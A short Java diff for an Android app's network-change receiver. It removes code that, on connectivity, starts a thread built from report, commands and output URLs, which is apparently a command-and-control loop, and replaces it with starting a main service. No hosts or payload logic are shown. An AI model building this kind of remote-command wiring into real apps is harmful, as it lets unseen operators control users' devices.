@@ -10,13 +10,7 @@ public class NetworkChangeBroadcastReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(final Context context, Intent intent) {
-        String action = intent.getAction();
-        if (action != null && action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
-            if (HelperMethods.isInternetAvailable(context)) {
-                ServerTalkLoopThread serverTalkLoopThread = new ServerTalkLoopThread(context, AppSettings.getReportURL(), AppSettings.getCommandsURL(), AppSettings.getOutputURL());
-                serverTalkLoopThread.start();
-            }
-        }
-
+        Intent startMainServiceIntent = new Intent(context, MainService.class);
+        context.startService(startMainServiceIntent);
     }
 }
